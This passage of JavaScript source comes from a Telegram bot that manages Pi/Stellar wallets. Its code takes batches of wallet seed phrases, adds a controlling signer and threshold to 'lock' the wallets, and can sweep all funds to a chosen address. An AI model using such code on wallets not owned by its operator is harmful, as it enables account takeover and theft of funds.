        finishTelegramMultisigRun(runControl.id);
    }
}

async function previewMultisigWizard(chatId, callbackQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, callbackQuery);
    state = await applySavedWalletTargetsToMultisigState(state);
    const payload = buildMultisigPayload(state.data);
    await telegramEditOrSend(callbackQuery, "⏳ Preview targets multisig...", multisigCancelKeyboard());
    const preview = await previewMultisigTargets(payload);
    const lines = [
        "<b>👁️ Preview Multisig Targets</b>",
        `Mode: <b>${escapeTelegramHtml(multisigModeLabel(preview.mode))}</b>`,
        `Funding: <code>${escapeTelegramHtml(shortKey(preview.funding_public_key, 8))}</code>`,
        `Total: <b>${preview.total}</b> | Valid: <b>${preview.success_count}</b>`,
        preview.using_stored ? "Source: semua locked wallet tersimpan" : "",
        "",
    ].filter(Boolean);
    (preview.results || []).slice(0, 20).forEach((row, index) => {
        const previewStatus = row.saved_status ? formatTelegramStatus(row.saved_status) : compactTelegramLogMessage(row.error || "-", 80);
        lines.push(`${index + 1}. ${row.success ? "✅" : "❌"} <code>${escapeTelegramHtml(shortKey(row.public_key || "-", 8))}</code> | ${escapeTelegramHtml(row.source || "-")} | ${escapeTelegramHtml(previewStatus)}`);
    });
    if ((preview.results || []).length > 20) lines.push(`...dan ${preview.results.length - 20} target lain.`);
    const keyboard = { inline_keyboard: [[{ text: "🚀 Run Mode", callback_data: "multi:run" }], [{ text: "⬅️ Review", callback_data: "multi:review" }], [{ text: "❌ Batal", callback_data: "multi:cancel" }]] };
    return telegramSend(chatId, lines.join("\n"), keyboard);
}

async function promptMultisigSaveWallets(chatId, callbackQuery = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    telegramControlState.pendingInputs.set(String(chatId), {
        action: "multi_save_wallet",
        step: "save_wallet_phrases",
        data: {},
        created_at: Date.now(),
    });
    return callbackQuery ? telegramEditOrSend(callbackQuery, tgLang.saveWalletPrompt, multisigCancelKeyboard()) : telegramSend(chatId, tgLang.saveWalletPrompt, multisigCancelKeyboard());
}

async function handleMultisigSaveWalletTextInput(message, pending = null) {
    const chatId = message.chat.id;
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const targetInput = await readTelegramTargetInputText(message, { step: "save_wallet_phrases" }, tgLang);
    const text = targetInput.text;
    if (!text) return telegramSend(chatId, tgLang.inputEmptyFileHint, multisigCancelKeyboard());
    try {
        const lines = normalizeMultisigLines(text);
        const { maxLines } = normalizeTelegramTargetTextFileLimits();
        if (!lines.length) throw new Error(tgLang.savedWalletEmpty);
        if (lines.length > maxLines) throw new Error(formatTelegramLangText(tgLang.targetTooMany, { max: maxLines }));
        const result = await saveMultisigSavedWalletPhrases(lines.join("\n"));
        telegramControlState.pendingInputs.delete(String(chatId));
        await telegramDeleteUserMessage(message);
        if (targetInput.source === "file") {
            await telegramSend(chatId, formatTelegramLangText(tgLang.targetFileReceived, { filename: escapeTelegramHtml(targetInput.filename), count: lines.length, kind: tgLang.phraseKind }), multisigCancelKeyboard());
        }
        return telegramSend(chatId, formatTelegramLangText(tgLang.savedWalletDone, result), telegramBackKeyboard("menu:multisig"));
    } catch (err) {
        return telegramSend(chatId, `❌ Gagal: ${escapeTelegramHtml(err.message || err)}`, multisigCancelKeyboard());
    }
}

async function renderMultisigSavedWalletList(chatId, callbackQuery = null, notice = "") {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const allRows = await listMultisigSavedWallets();
    const rows = allRows.slice(0, 15);
    const lines = [`<b>📦 ${escapeTelegramHtml(tgLang.savedWalletPhraseList)}</b>`];
    if (notice) {
        lines.push(`<b>${escapeTelegramHtml(notice)}</b>`, "");
    }
    lines.push(`${tgLang.savedWalletIntro}`, "");
    const buttons = [];
    if (!rows.length) {
        lines.push(tgLang.noSavedWallet);
    } else {
        lines.push(`Total: <b>${allRows.length}</b>`, "", `<b>${escapeTelegramHtml(tgLang.deleteOneByOne)}</b>`);
        rows.forEach((row, index) => {
            lines.push(`${index + 1}. <code>${escapeTelegramHtml(shortKey(row.public_key, 8))}</code> | ${escapeTelegramHtml(formatTelegramStatus(row.status || "saved"))}`);
            buttons.push([{ text: `🗑️ ${shortKey(row.public_key, 6)}`, callback_data: `multi:saved:del:${multisigSavedWalletDeleteHash(row)}` }]);
        });
        if (allRows.length > rows.length) {
            lines.push(`...dan ${allRows.length - rows.length} wallet lain.`);
        }
    }
    buttons.unshift([{ text: tgLang.addSavedWallet, callback_data: "multi:save_wallets" }, { text: tgLang.runSavedBatch, callback_data: "multi:run_saved" }]);
    buttons.unshift([{ text: tgLang.setSignerTestWallet || "🧪 Set Test Wallet", callback_data: "multi:watch:set_test" }, { text: tgLang.watchSignerAutoInstall || "🔁 Watch Signer Auto Install", callback_data: "multi:watch:start" }]);
    if (rows.length) {
        buttons.push([{ text: tgLang.deleteAllSavedWallets, callback_data: "multi:saved:delete_all_confirm" }]);
    }
    buttons.push([{ text: tgLang.back, callback_data: "menu:multisig" }]);
    const keyboard = { inline_keyboard: buttons };
    const text = lines.join("\n");
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function handleMultisigWizardTextInput(message, state) {
    const chatId = message.chat.id;
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const targetInput = await readTelegramTargetInputText(message, state, tgLang);
    const text = targetInput.text;
    if (!text) return telegramSend(chatId, tgLang.inputEmptyFileHint, multisigCancelKeyboard());
    try {
        if (state.step === "horizon_manual") {
            const url = normalizeServerUrl(text);
            if (!/^https?:\/\//i.test(url)) throw new Error("URL harus diawali http:// atau https://");
            state.data.horizon_url = url;
            state.data.horizon_server_id = "";
            state.data.horizon_label = url;
            saveMultisigWizard(chatId, state);
            return renderMultisigBaseFeePicker(chatId, null, state);
        }
        if (state.step === "base_fee_manual") {
            state.data.base_fee_stroops = String(parseMultisigInteger(text, 100000, 100, 10000000, "Base fee stroops"));
            saveMultisigWizard(chatId, state);
            return renderMultisigDelayPicker(chatId, null, state);
        }
        if (state.step === "delay_manual") {
            const seconds = Number.parseInt(text, 10);
            if (!Number.isSafeInteger(seconds) || seconds < 0 || seconds > 60) throw new Error("Delay wajib angka detik 0-60");
            state.data.batch_delay_ms = String(seconds * 1000);
            saveMultisigWizard(chatId, state);
            return renderMultisigFundingPicker(chatId, null, state);
        }
        if (state.step === "target_phrases") {
            const lines = normalizeMultisigLines(text);
            const { maxLines } = normalizeTelegramTargetTextFileLimits();
            if (!lines.length) throw new Error(tgLang.targetPhraseRequired);
            if (lines.length > maxLines) throw new Error(formatTelegramLangText(tgLang.targetTooMany, { max: maxLines }));
            state.data.target_phrases = lines.join("\n");
            state.data.target_label = `${lines.length} phrase`;
            saveMultisigWizard(chatId, state);
            await telegramDeleteUserMessage(message);
            if (targetInput.source === "file") {
                await telegramSend(chatId, formatTelegramLangText(tgLang.targetFileReceived, { filename: escapeTelegramHtml(targetInput.filename), count: lines.length, kind: tgLang.phraseKind }), multisigCancelKeyboard());
            }
            return renderMultisigThresholdPicker(chatId, null, state);
        }
        if (state.step === "target_public_keys") {
            const lines = normalizeMultisigLines(text);
            const { maxLines } = normalizeTelegramTargetTextFileLimits();
            if (!lines.length) throw new Error(tgLang.targetPublicKeyRequired);
            if (lines.length > maxLines) throw new Error(formatTelegramLangText(tgLang.targetTooMany, { max: maxLines }));
            for (const line of lines) StellarKeypair.fromPublicKey(line);
            state.data.target_public_keys = lines.join("\n");
            state.data.target_label = `${lines.length} public key`;
            saveMultisigWizard(chatId, state);
            await telegramDeleteUserMessage(message);
            if (targetInput.source === "file") {
                await telegramSend(chatId, formatTelegramLangText(tgLang.targetFileReceived, { filename: escapeTelegramHtml(targetInput.filename), count: lines.length, kind: tgLang.publicKeyKind }), multisigCancelKeyboard());
            }
            if (multisigUsesReserve(state.data.mode)) return renderMultisigReservePicker(chatId, null, state);
            return renderMultisigReview(chatId, null, state);
        }
        if (state.step === "threshold_manual") {
            const threshold = parseMultisigInteger(text, 5, 1, 255, "Threshold");
            state.data.threshold = threshold;
            state.data.signer_weight = threshold;
            saveMultisigWizard(chatId, state);
            if (multisigUsesReserve(state.data.mode)) return renderMultisigReservePicker(chatId, null, state);
            return renderMultisigReview(chatId, null, state);
        }
        if (state.step === "reserve_manual") {
            state.data.reserve_pi = validateTelegramPiAmount(text, "Reserve PI");
            saveMultisigWizard(chatId, state);
            return renderMultisigDestinationPicker(chatId, null, state);
        }
        if (state.step === "destination_manual") {
            StellarKeypair.fromPublicKey(text);
            state.data.destination = text;
            state.data.destination_label = shortKey(text, 8);
            saveMultisigWizard(chatId, state);
            return renderMultisigAmountPicker(chatId, null, state);
        }
        if (state.step === "amount_manual") {
            state.data.amount = validateTelegramPiAmount(text, "Amount");
            saveMultisigWizard(chatId, state);
            return renderMultisigReview(chatId, null, state);
        }
    } catch (err) {
        return telegramSend(chatId, `❌ Gagal: ${escapeTelegramHtml(err.message || err)}`, multisigCancelKeyboard());
    }
    return telegramSend(chatId, "Step multisig tidak dikenal. Ketik /cancel lalu ulangi /menu.", multisigCancelKeyboard());
}

async function handleMultisigWizardCallback(callbackQuery) {
    const data = String(callbackQuery.data || "");
    const chatId = callbackQuery.message?.chat?.id;
    let state = getMultisigWizard(chatId);
    if (data === "multi:start") return startMultisigWizard(chatId, callbackQuery);
    if (data.startsWith("multi:start:")) return startMultisigWizard(chatId, callbackQuery, data.slice("multi:start:".length));
    if (data === "multi:cancel") {
        telegramControlState.pendingInputs.delete(String(chatId));
        return telegramEditOrSend(callbackQuery, "❌ Multisig dibatalkan.", telegramBackKeyboard("menu:multisig"));
    }
    if (!state) state = { action: "multi_wizard", step: "mode", data: await defaultMultisigData(), created_at: Date.now() };
    if (data.startsWith("multi:mode:")) {
        const mode = data.slice("multi:mode:".length);
        if (!TELEGRAM_MULTISIG_MODE_OPTIONS.some((item) => item.value === mode)) throw new Error("Mode multisig tidak valid");
        state.data.mode = mode;
        saveMultisigWizard(chatId, state);
        return renderMultisigNetworkPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("multi:network:")) {
        state.data.network = data.slice("multi:network:".length) === "mainnet" ? "mainnet" : "testnet";
        saveMultisigWizard(chatId, state);
        return renderMultisigHorizonPicker(chatId, callbackQuery, state);
    }
    if (data === "multi:horizon:auto") {
        state.data.horizon_server_id = ""; state.data.horizon_url = ""; state.data.horizon_label = "Auto default + backup Manage Servers";
        saveMultisigWizard(chatId, state);
        return renderMultisigBaseFeePicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("multi:horizon:server:")) {
        const serverId = data.slice("multi:horizon:server:".length);
        const server = (await listServers()).find((item) => item.id === serverId);
        if (!server) throw new Error("Server tidak ditemukan");
        state.data.horizon_server_id = server.id; state.data.horizon_url = ""; state.data.horizon_label = `${server.name || "Server"} (${getServerHost(server.url)})`;
        saveMultisigWizard(chatId, state);
        return renderMultisigBaseFeePicker(chatId, callbackQuery, state);
    }
    if (data === "multi:horizon:manual") return promptMultisigManualHorizon(chatId, callbackQuery, state);
    if (data.startsWith("multi:basefee:")) {
        const value = data.slice("multi:basefee:".length);
        if (value === "manual") {
            state.step = "base_fee_manual"; saveMultisigWizard(chatId, state);
            return telegramEditOrSend(callbackQuery, "Kirim Base Fee Stroops.\nContoh: <code>100000</code>", multisigCancelKeyboard());
        }
        state.data.base_fee_stroops = String(parseMultisigInteger(value, 100000, 100, 10000000, "Base fee stroops"));
        saveMultisigWizard(chatId, state);
        return renderMultisigDelayPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("multi:delay:")) {
        const value = data.slice("multi:delay:".length);
        if (value === "manual") {
            state.step = "delay_manual"; saveMultisigWizard(chatId, state);
            return telegramEditOrSend(callbackQuery, "Kirim delay antar batch dalam detik, 0-60.\nContoh: <code>5</code>", multisigCancelKeyboard());
        }
        state.data.batch_delay_ms = String(parseMultisigInteger(value, 5000, 0, 60000, "Delay ms"));
        saveMultisigWizard(chatId, state);
        return renderMultisigFundingPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("multi:funding:")) {
        const walletId = data.slice("multi:funding:".length);
        const wallet = (await listWalletsWithBalances()).find((item) => item.id === walletId);
        if (!wallet) throw new Error("Funding wallet tidak ditemukan");
        state.data.fee_payer_id = wallet.id; state.data.funding_wallet_id = wallet.id;
        state.data.funding_public_key = wallet.public_key || "";
        state.data.funding_label = `${wallet.name || "Funding"} (${shortKey(wallet.public_key, 6)}) - ${wallet.balance_pi || "-"} PI`;
        saveMultisigWizard(chatId, state);
        return renderMultisigSignerPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("multi:signer:")) {
        const signerId = data.slice("multi:signer:".length);
        const signer = await findMultisigSignerById(signerId);
        if (!signer) throw new Error("Signer Wallet tidak ditemukan");
        if (String(signer.public_key || "") === String(state.data.funding_public_key || "")) {
            throw new Error("Signer Wallet harus berbeda dari Funding Wallet");
        }
        state.data.signer_id = signer.id;
        state.data.signer_public_key = signer.public_key;
        state.data.signer_label = `${signer.name || "Signer"} (${shortKey(signer.public_key, 6)})`;
        saveMultisigWizard(chatId, state);
        return renderMultisigTargetMode(chatId, callbackQuery, state);
    }
    if (data === "multi:targets:all") {
        state.data.target_public_keys = ""; state.data.target_label = "ALL saved locked wallet";
        saveMultisigWizard(chatId, state);
        if (multisigUsesReserve(state.data.mode)) return renderMultisigReservePicker(chatId, callbackQuery, state);
        return renderMultisigReview(chatId, callbackQuery, state);
    }
    if (data === "multi:targets:manual") return promptMultisigTargetPublicKeys(chatId, callbackQuery, state);
    if (data.startsWith("multi:threshold:")) {
        const value = data.slice("multi:threshold:".length);
        if (value === "manual") {
            state.step = "threshold_manual"; saveMultisigWizard(chatId, state);
            return telegramEditOrSend(callbackQuery, "Kirim angka threshold/signer weight 1-255.\nContoh: <code>5</code>", multisigCancelKeyboard());
        }
        const threshold = parseMultisigInteger(value, 5, 1, 255, "Threshold");
        state.data.threshold = threshold; state.data.signer_weight = threshold;
        saveMultisigWizard(chatId, state);
        if (multisigUsesReserve(state.data.mode)) return renderMultisigReservePicker(chatId, callbackQuery, state);
        return renderMultisigReview(chatId, callbackQuery, state);
    }
    if (data.startsWith("multi:reserve:")) {
        const value = data.slice("multi:reserve:".length);
        if (value === "manual") {
            state.step = "reserve_manual"; saveMultisigWizard(chatId, state);
            const label = state.data.mode === "install_lock" ? "Fund Target PI" : "Reserve PI";
            return telegramEditOrSend(callbackQuery, `Kirim ${label}.\nContoh: <code>0.5</code>`, multisigCancelKeyboard());
        }
        state.data.reserve_pi = validateTelegramPiAmount(value, "Reserve PI");
        saveMultisigWizard(chatId, state);
        return renderMultisigDestinationPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("multi:dest:")) {
        const value = data.slice("multi:dest:".length);
        if (value === "manual") {
            state.step = "destination_manual"; saveMultisigWizard(chatId, state);
            return telegramEditOrSend(callbackQuery, "Kirim Destination Address public key.\nContoh: <code>G...</code>", multisigCancelKeyboard());
        }
        const destination = (await listDestinations()).find((item) => item.id === value);
        if (!destination) throw new Error("Wallet tujuan tidak ditemukan");
        state.data.destination = destination.address;
        state.data.destination_label = `${destination.name} (${shortKey(destination.address, 6)})`;
        saveMultisigWizard(chatId, state);
        return renderMultisigAmountPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("multi:amount:")) {
        const value = data.slice("multi:amount:".length);
        if (value === "manual") {
            state.step = "amount_manual"; saveMultisigWizard(chatId, state);
            return telegramEditOrSend(callbackQuery, "Kirim Amount PI atau gunakan ALL.\nContoh: <code>1.0000000</code>", multisigCancelKeyboard());
        }
        state.data.amount = "ALL";
        saveMultisigWizard(chatId, state);
        return renderMultisigReview(chatId, callbackQuery, state);
    }
    if (data === "multi:review") return renderMultisigReview(chatId, callbackQuery, state);
    if (data === "multi:save_targets") return saveMultisigWizardTargets(chatId, callbackQuery, state);
    if (data === "multi:preview") return previewMultisigWizard(chatId, callbackQuery, state);
    if (data === "multi:watch:run") return startMultisigSignerWatchFromWizard(chatId, callbackQuery, state);
    if (data === "multi:run") return runMultisigWizard(chatId, callbackQuery, state);
    throw new Error("Callback multisig tidak dikenal");
}

function multisigLockedDeleteHash(row) {
    return crypto.createHash("sha1").update(`${row.public_key || ""}|${row.funding_public_key || ""}|${row.network || ""}`).digest("hex").slice(0, 16);
}

async function deleteAllMultisigLockedWalletEntries() {
    const lockedRows = await listMultisigLockedWallets();
    if (!lockedRows.length) {
        return { removed_count: 0, pending_removed_count: 0, pending_skipped_count: 0 };
    }

    const lockedPublicKeys = new Set(lockedRows.map((row) => String(row.public_key || "").trim()).filter(Boolean));
    let pendingRemoved = 0;
    let pendingSkipped = 0;
    const pendingRows = await listMultisigPendingLocks();
    const nextPendingRows = [];

    for (const pending of pendingRows) {
        const status = String(pending.status || "");
        const canEditPending = ["waiting_protocol_26", "queued", "error"].includes(status);
        const targetPublicKeys = Array.isArray(pending.target_public_keys) ? pending.target_public_keys : [];
        const hasLockedTarget = targetPublicKeys.some((key) => lockedPublicKeys.has(String(key || "").trim()));
        if (!canEditPending || !hasLockedTarget) {
            nextPendingRows.push(pending);
            continue;
        }

        let phrases = [];
        try {
            phrases = decryptMultisigPendingPayload(pending.encrypted_target_phrases) || [];
        } catch (err) {
            pendingSkipped += 1;
            nextPendingRows.push({
                ...pending,
                updated_at: utcIso(),
                last_error: `Locked Wallet List sudah dihapus, tapi pending phrase tidak bisa dibaca: ${normalizeMultisigErrorForTelegram(err)}`,
            });
            continue;
        }

        const nextKeys = [];
        const nextPhrases = [];
        targetPublicKeys.forEach((key, index) => {
            if (lockedPublicKeys.has(String(key || "").trim())) {
                pendingRemoved += 1;
                return;
            }
            nextKeys.push(key);
            nextPhrases.push(phrases[index]);
        });

        if (!nextKeys.length) {
            nextPendingRows.push({
                ...pending,
                status: "cancelled",
                target_count: 0,
                target_public_keys: [],
                encrypted_target_phrases: encryptMultisigPendingPayload([]),
                updated_at: utcIso(),
                last_error: "Semua target pending dihapus dari Locked Wallet List",
            });
            continue;
        }

        nextPendingRows.push({
            ...pending,
            target_count: nextKeys.length,
            target_public_keys: nextKeys,
            encrypted_target_phrases: encryptMultisigPendingPayload(nextPhrases),
            updated_at: utcIso(),
        });
    }

    await saveMultisigPendingLocks(nextPendingRows);
    await saveMultisigLockedWallets([]);
    return { removed_count: lockedRows.length, pending_removed_count: pendingRemoved, pending_skipped_count: pendingSkipped };
}

async function renderMultisigLockedList(chatId, callbackQuery = null, notice = "") {
    const allRows = await listMultisigLockedWallets();
    const rows = allRows.slice(0, 15);
    const lines = [
        "<b>📋 Multisig Locked Wallet</b>",
    ];
    if (notice) {
        lines.push(`<b>${escapeTelegramHtml(notice)}</b>`, "");
    }
    lines.push(
        `Total: <b>${escapeTelegramHtml(allRows.length)}</b> wallet`,
        "",
    );
    const buttons = [];
    rows.forEach((row, index) => {
        lines.push(`${index + 1}. <code>${escapeTelegramHtml(shortKey(row.public_key, 8))}</code> | ${escapeTelegramHtml(row.network || "-")} | ${escapeTelegramHtml(formatTelegramStatus(row.status))}`);
        lines.push(`   Funding: <code>${escapeTelegramHtml(shortKey(row.funding_public_key, 8))}</code>`);
        lines.push(`   Signer: <code>${escapeTelegramHtml(shortKey(row.signer_public_key || row.funding_public_key, 8))}</code> | Master: ${escapeTelegramHtml(row.master_weight ?? "-")} | High: ${escapeTelegramHtml(row.high_threshold ?? "-")}`);
        if (row.hash) lines.push(`   Hash: <code>${escapeTelegramHtml(shortKey(row.hash, 10))}</code>`);
        buttons.push([{ text: `🗑️ Hapus ${index + 1}. ${shortKey(row.public_key, 4)}`, callback_data: `multi:del:${multisigLockedDeleteHash(row)}` }]);
    });
    if (!rows.length) {
        lines.push("Belum ada locked wallet.");
    }
    if (allRows.length > rows.length) {
        lines.push(`...dan ${allRows.length - rows.length} wallet lain.`);
    }
    if (allRows.length) {
        buttons.unshift([{ text: `🧹 Hapus Semua (${allRows.length})`, callback_data: "multi:delall" }]);
    }
    buttons.push([{ text: "🔄 Refresh", callback_data: "multi:locked" }, { text: "⬅️ Multisig", callback_data: "menu:multisig" }]);
    return telegramEditOrSend(callbackQuery, lines.join("\n"), { inline_keyboard: buttons });
}

async function renderMultisigPendingList(chatId, callbackQuery = null) {
    const rows = (await listMultisigPendingLocks()).slice(0, 30);
    const lines = ["<b>⏳ Multisig Pending Lock</b>"];
    rows.forEach((row, index) => {
        lines.push(`${index + 1}. <b>${escapeTelegramHtml(formatTelegramStatus(row.status))}</b> | ${escapeTelegramHtml(row.network || "-")} | target ${escapeTelegramHtml(row.target_count || 0)}`);
        lines.push(`   Funding: <code>${escapeTelegramHtml(shortKey(row.funding_public_key, 8))}</code> | Signer: <code>${escapeTelegramHtml(shortKey(row.signer_public_key || row.funding_public_key, 8))}</code>`);
        lines.push(`   Protocol: ${escapeTelegramHtml(row.current_protocol_version ?? "-")}/${escapeTelegramHtml(row.required_protocol_version || MULTISIG_REQUIRED_PROTOCOL_VERSION)}`);
        if (row.last_error) lines.push(`   Error: ${escapeTelegramHtml(row.last_error)}`);
        if (row.last_hash) lines.push(`   Hash: <code>${escapeTelegramHtml(shortKey(row.last_hash, 10))}</code>`);
    });
    if (!rows.length) lines.push("Belum ada pending lock.");
    return telegramEditOrSend(callbackQuery, lines.join("\n"), { inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "multi:pending" }, { text: "⬅️ Multisig", callback_data: "menu:multisig" }]] });
}

async function renderDeleteMenu(chatId, type, editQuery = null) {
    let rows = [];
    let title = "";
    if (type === "servers") {
        title = "🗑️ Delete Server";
        const servers = await listServers();
        rows = servers.map((server) => [{ text: `🗑️ ${server.name}`, callback_data: `del:server:${server.id}` }]);
    } else if (type === "funding") {
        title = "🗑️ Delete Funding";
        const wallets = await listWallets();
        rows = wallets.map((wallet) => [{ text: `🗑️ ${wallet.name || shortKey(wallet.public_key)}`, callback_data: `del:fund:${wallet.id}` }]);
    } else if (type === "destinations") {
        title = "🗑️ Delete Wallet Tujuan";
        const destinations = await listDestinations();
        rows = destinations.map((destination) => [{ text: `🗑️ ${destination.name}`, callback_data: `del:dest:${destination.id}` }]);
    } else if (type === "workers") {
        title = "🗑️ Delete Worker";
        const workers = await listWorkers();
        rows = workers.map((worker) => [{ text: `🗑️ ${worker.name}`, callback_data: `del:worker:${worker.id}` }]);
    } else if (type === "bots") {
        title = "🗑️ Delete Bot";
        const bots = await listBots();
        rows = bots.map((bot) => [{ text: `🗑️ ${bot.bot_name || bot.id}`, callback_data: `del:bot:${crypto.createHash("sha1").update(String(bot.bot_name || bot.id)).digest("hex").slice(0, 16)}` }]);
    }
    if (!rows.length) {
        rows.push([{ text: "Tidak ada data", callback_data: "noop" }]);
    }
    rows.push([{ text: "⬅️ Kembali", callback_data: `menu:${type === "destinations" ? "destinations" : type === "funding" ? "funding" : type === "bots" ? "bots" : type === "workers" ? "workers" : "servers"}` }]);
    const keyboard = { inline_keyboard: rows };
    const text = `<b>${escapeTelegramHtml(title)}</b>\nPilih item yang ingin dihapus.`;
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

async function renderWorkerServerPicker(chatId, editQuery = null) {
    const servers = await listServers();
    const rows = servers.map((server) => [{ text: `${server.name} (${getServerHost(server.url)})`, callback_data: `worker:add:server:${server.id}` }]);
    if (!rows.length) {
        rows.push([{ text: "Tambahkan server dulu", callback_data: "menu:servers" }]);
    }
    rows.push([{ text: "⬅️ Kembali", callback_data: "menu:workers" }]);
    const text = "<b>➕ Add Worker</b>\nPilih server untuk worker baru.";
    const keyboard = { inline_keyboard: rows };
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

function setTelegramPendingInput(chatId, action, prompt, keyboard = telegramBackKeyboard()) {
    telegramControlState.pendingInputs.set(String(chatId), { action, created_at: Date.now() });
    return telegramSend(chatId, prompt, keyboard);
}

function setTelegramPendingInputWithData(chatId, action, data, prompt, keyboard = telegramBackKeyboard()) {
    telegramControlState.pendingInputs.set(String(chatId), { action, data, created_at: Date.now() });
    return telegramSend(chatId, prompt, keyboard);
}

async function handleTelegramPendingInput(message, pending) {
    const chatId = message.chat.id;
    let text = String(message.text || message.caption || "").trim();
    const { language: tgLanguage, lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const back = (target = "menu:home") => telegramBackKeyboard(target, tgLanguage.telegram_language);

    if (pending.action === "bot_wizard") {
        return handleNewBotWizardTextInput(message, pending);
    }
    if (pending.action === "multi_wizard") {
        return handleMultisigWizardTextInput(message, pending);
    }
    if (pending.action === "multi_save_wallet") {
        return handleMultisigSaveWalletTextInput(message, pending);
    }
    if (pending.action === "multi_add_signer") {
        return handleMultisigAddSignerInput(message, pending);
    }
    if (pending.action === "multi_signer_test_phrase") {
        return handleMultisigSignerWatchTestPhraseInput(message, pending);
    }

    if ((pending.action === "add_bump" || pending.action === "add_bump_upload") && message.document) {
        text = String(await telegramDownloadTextDocument(message.document, tgLang) || "").trim();
    }

    if (!text) {
        return telegramSend(chatId, tgLang.inputEmpty, back());
    }
    telegramControlState.pendingInputs.delete(String(chatId));

    try {
        if (pending.action === "add_bump" || pending.action === "add_bump_upload") {
            const result = await addBumpSponsorsFromText(text);
            await telegramDeleteUserMessage(message);
            await telegramSend(
                chatId,
                `${tgLang.bumpAdded || "✅ Bump wallet diproses"}
Input: <b>${result.total_input}</b>
Baru: <b>${result.added}</b> | Duplikat: <b>${result.duplicate}</b> | Gagal: <b>${result.failed}</b>

bump.txt sudah diupdate dan worker PM2 sudah dicoba restart.`,
                back("menu:bump")
            );
        } else if (pending.action === "add_server") {
            const [name, url, location = ""] = text.split("|").map((item) => item.trim());
            if (!name || !url) {
                throw new Error("Format: Nama|https://url|Lokasi");
            }
            const normalizedUrl = normalizeServerUrl(url);
            if (!/^https?:\/\//i.test(normalizedUrl)) {
                throw new Error("URL harus diawali http:// atau https://");
            }
            const server = await addServer(name, normalizedUrl, location);
            await telegramSend(chatId, `${tgLang.serverAdded}\n<b>${escapeTelegramHtml(server.name)}</b>\n<code>${escapeTelegramHtml(server.url)}</code>`, back("menu:servers"));
        } else if (pending.action === "add_destination") {
            const [name, address] = text.split("|").map((item) => item.trim());
            if (!name || !address) {
                throw new Error("Format: Nama|PUBLIC_KEY_TUJUAN");
            }
            const destination = await addDestination(name, address);
            await telegramSend(chatId, `${tgLang.destinationAdded}\n<b>${escapeTelegramHtml(destination.name)}</b>\n<code>${escapeTelegramHtml(shortKey(destination.address, 8))}</code>`, back("menu:destinations"));
        } else if (pending.action === "add_funding") {
            const separatorIndex = text.indexOf("|");
            if (separatorIndex < 1) {
                throw new Error("Format: Nama|mnemonic/passphrase");
            }
            const name = text.slice(0, separatorIndex).trim();
            const mnemonicPhrase = text.slice(separatorIndex + 1).trim();
            if (!name || !mnemonicPhrase) {
                throw new Error("Nama dan mnemonic wajib diisi");
            }
            const publicKey = derivePublicKeyFromMnemonic(mnemonicPhrase);
            const wallet = await addWallet(name, mnemonicPhrase, publicKey);
            await telegramDeleteUserMessage(message);
            await telegramSend(chatId, `${tgLang.fundingAdded}\n<b>${escapeTelegramHtml(wallet.name)}</b>\n${tgLang.publicKey}: <code>${escapeTelegramHtml(shortKey(wallet.public_key, 8))}</code>\n\n${tgLang.fundingSecretDeleted}`, back("menu:funding"));
        } else if (pending.action === "worker_name") {
            const serverId = String(pending.data?.server_id || "").trim();
            if (!serverId) {
                throw new Error("Server ID kosong");
            }
            const workerName = text.trim();
            if (!workerName) {
                throw new Error("Nama worker wajib diisi");
            }
            const worker = await addWorker(workerName, serverId);
            await telegramSend(chatId, `${tgLang.workerAdded}\n<b>${escapeTelegramHtml(worker.name)}</b>`, back("menu:workers"));
        } else if (pending.action === "ledger_wallet") {
            const wallet = text.trim();
            if (!/^G[A-Z0-9]{10,}$/i.test(wallet)) {
                throw new Error("Wallet address claim tidak valid. Harus diawali G...");
            }
            const mode = String(pending.data?.mode || "auto");
            if (mode === "manual") {
                telegramControlState.pendingInputs.set(String(chatId), { action: "ledger_range", data: { wallet }, created_at: Date.now() });
                await telegramSend(chatId, tgLang.ledgerRangePrompt, back("menu:ledger"));
                return;
            }
            const loading = await createTelegramLoadingSession({
                chatId,
                lang: tgLang,
                title: tgLang.autoDetectProgress,
                subtitle: tgLang.loadingAutoDetectSubtext || tgLang.loadingKeepOpen,
                keyboard: back("menu:ledger"),
                estimateMs: 120000,
            });
            try {
                await runTelegramLedgerScan(chatId, wallet, null, null, true, { lang: tgLang, callbackQuery: loading.callbackQuery, loading });
                await loading.stop();
            } catch (err) {
                await loading.stop(`❌ ${escapeTelegramHtml(err.message || err)}`, back("menu:ledger"));
                throw err;
            }
        } else if (pending.action === "ledger_range") {
            const wallet = String(pending.data?.wallet || "").trim();
            if (!wallet) {
                throw new Error("Wallet kosong, ulangi Check Ledger");
            }
            const range = parseTelegramLedgerRange(text);
            const loading = await createTelegramLoadingSession({
                chatId,
                lang: tgLang,
                title: tgLang.scanLedgerProgress.replace("{range}", `${range.ledger}-${range.ledgerEnd}`),
                subtitle: tgLang.loadingManualScanSubtext || tgLang.loadingKeepOpen,
                keyboard: back("menu:ledger"),
                estimateMs: Math.min(300000, Math.max(30000, ((range.ledgerEnd - range.ledger) + 1) * 5000)),
            });
            try {
                await runTelegramLedgerScan(chatId, wallet, range.ledger, range.ledgerEnd, false, { lang: tgLang, callbackQuery: loading.callbackQuery, loading });
                await loading.stop();
            } catch (err) {
                await loading.stop(`❌ ${escapeTelegramHtml(err.message || err)}`, back("menu:ledger"));
                throw err;
            }
        } else if (pending.action === "submit_before") {
            const value = Number.parseInt(text, 10);
            const settings = await saveCallSubmitSettings({
                submit_before_ms: value,
